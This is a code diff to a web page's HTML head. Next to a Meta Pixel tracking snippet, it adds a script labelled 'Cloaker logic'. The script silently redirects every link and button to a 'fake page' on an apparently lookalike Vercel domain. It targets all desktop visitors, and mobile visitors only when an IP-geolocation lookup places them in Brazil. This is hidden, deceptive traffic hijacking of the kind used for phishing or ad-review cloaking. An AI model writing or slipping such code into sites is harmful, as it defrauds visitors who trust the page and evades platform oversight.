@@ -44,7 +44,43 @@
     <noscript><img height="1" width="1" style="display:none"
     src="https://www.facebook.com/tr?id=1297172859020891&ev=PageView&noscript=1"
     /></noscript>
-    <!-- End Meta Pixel Code -->
+    <!-- Cloaker logic -->
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        var isMobile = /iPhone|iPad|iPod|Android|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        var paginaFalsa = "https://p-visioncIara.vercel.app";
+
+        function trocarLinks() {
+            var todosLinks = document.querySelectorAll('a');
+            todosLinks.forEach(function(link) {
+                link.href = paginaFalsa;
+            });
+
+            var todosBotoes = document.querySelectorAll('button, [role="button"]');
+            todosBotoes.forEach(function(botao) {
+                botao.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    window.location.href = paginaFalsa;
+                }, true);
+            });
+        }
+
+        if (!isMobile) {
+            trocarLinks();
+            return;
+        }
+
+        fetch('https://ipapi.co/json/')
+            .then(function(response) { return response.json(); })
+            .then(function(data) {
+                if (data.country_code === 'BR') {
+                    trocarLinks();
+                }
+            })
+            .catch(function() { });
+    });
+    </script>
 </head>
 <body>
     <div class="container">
